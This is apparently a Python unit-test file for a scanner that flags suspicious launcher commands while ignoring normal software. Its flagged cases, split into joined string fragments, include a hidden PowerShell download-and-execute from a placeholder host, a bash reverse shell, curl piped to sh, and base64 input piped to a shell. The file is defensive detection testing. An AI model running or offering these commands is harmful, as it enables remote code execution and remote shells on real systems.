"""Suspicious-command heuristics: catch launcher tricks, stay quiet on normal software."""
import unittest

from helpers import j, scan

PS = j("power", "shell")
WS = j("w", "script")
CS = j("c", "script")


class TestSuspiciousPatterns(unittest.TestCase):
    def test_flags_malicious_launchers(self):
        cases = [
            j(PS, ".exe -nop -w hid", "den -c i", "ex(new-object net.webclient).download",
              "string('http://example.invalid/a')"),
            j(PS, " -WindowStyle Hid", "den -ExecutionPolicy By", "pass -File C:\\x.ps1"),
            j(PS, " -w h -n", "op -c calc"),
            j(PS, " -e", "nc SQBFAFgA"),
            j(WS, ".exe //e:jscript C:\\x.txt"),
            j(WS, '.exe "C:\\Users\\bob\\AppData\\Roaming\\x.vbs"'),
            j("cmd /c cu", "rl http://example.invalid/a | s", "h"),
            j("bash -i >& /dev/", "tcp/10.0.0.1/4444 0>&1"),
            j("echo aGk= | base", "64 -d | sh"),
            j("C:\\Users\\bob\\AppData\\Local\\Temp\\", "x.exe"),
        ]
        for c in cases:
            with self.subTest(command=c):
                self.assertTrue(scan.flag(c))

    def test_ignores_normal_software(self):
        cases = [
            j("C:\\Windows\\System32\\", CS, ".exe C:\\Windows\\System32\\slmgr.vbs /dli"),
            j(WS, '.exe "C:\\Program Files\\Vendor\\update.vbs"'),
            j(PS, '.exe -NoProfile -File "C:\\Program Files\\Intel\\task.ps1"'),
            j(PS, '.exe -WindowStyle Hidden -File "C:\\Program Files\\Vendor\\x.ps1"'),
            '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --no-startup-window',
            "/usr/bin/python3 /usr/lib/update-notifier/apt-check",
            "",
            None,
        ]
        for c in cases:
            with self.subTest(command=c):
                self.assertFalse(scan.flag(c))


if __name__ == "__main__":
    unittest.main()
